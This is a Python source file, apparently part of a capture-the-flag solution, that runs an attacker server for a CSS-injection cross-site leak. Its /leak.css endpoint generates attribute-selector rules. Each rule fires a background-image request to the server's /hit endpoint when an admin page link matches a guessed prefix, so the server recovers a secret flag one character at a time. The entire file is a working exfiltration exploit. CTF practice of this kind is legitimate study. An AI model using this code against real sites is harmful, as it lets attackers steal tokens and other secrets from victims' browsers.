#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""xsleak — CSS Injection XS-Leak 용 공격 CSS 서버 (text/css 로 서빙).
 /leak.css : 현재까지 복원한 접두사 뒤 한 글자를 후보별 속성선택자로 누출(matching 글자만 background:url 발사)
 /hit?c=X  : 누출된 글자 기록 (접두사 확장)
 /known    : 드라이버가 폴링        /reset : 초기화('flag{')

사용:  python xsleak_server.py        # host:8001 (xsleak_solve.py 와 함께 사용)
"""
import http.server, socketserver, urllib.parse, sys, threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8001
EXFIL = "host.docker.internal:%d" % PORT
PREFIX = "javascript:alert('"          # admin view 시 href="javascript:alert('FLAG')"
CHARSET = "0123456789abcdef}-_"
known = {"v": "flag{"}                  # flag 형식 기지 → 나머지 복원
lock = threading.Lock()

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == "/leak.css":
            with lock: pre = PREFIX + known["v"]
            rules = []
            for ch in CHARSET:
                val = (pre + ch).replace("\\", "\\\\").replace('"', '\\"')
                hit = "//%s/hit?c=%s" % (EXFIL, urllib.parse.quote(ch))
                rules.append('a[href^="%s"]{background:url(%s)}' % (val, hit))
            body = "\n".join(rules).encode()
            self.send_response(200); self.send_header("Content-Type", "text/css")
            self.send_header("Cache-Control", "no-store"); self.end_headers(); self.wfile.write(body)
        elif u.path == "/hit":
            ch = q.get("c", [""])[0]
            with lock:
                if ch and not known["v"].endswith("}"):
                    known["v"] += ch
                    sys.stdout.write("HIT %r -> %s\n" % (ch, known["v"])); sys.stdout.flush()
            self.send_response(200); self.send_header("Content-Type", "image/gif"); self.end_headers()
        elif u.path == "/known":
            self.send_response(200); self.end_headers(); self.wfile.write(known["v"].encode())
        elif u.path == "/reset":
            with lock: known["v"] = "flag{"
            self.send_response(200); self.end_headers(); self.wfile.write(b"reset")
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

class TCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    print("[*] xsleak CSS 서버: 0.0.0.0:%d  (@import 대상: //%s/leak.css)" % (PORT, EXFIL), flush=True)
    TCP(("0.0.0.0", PORT), H).serve_forever()
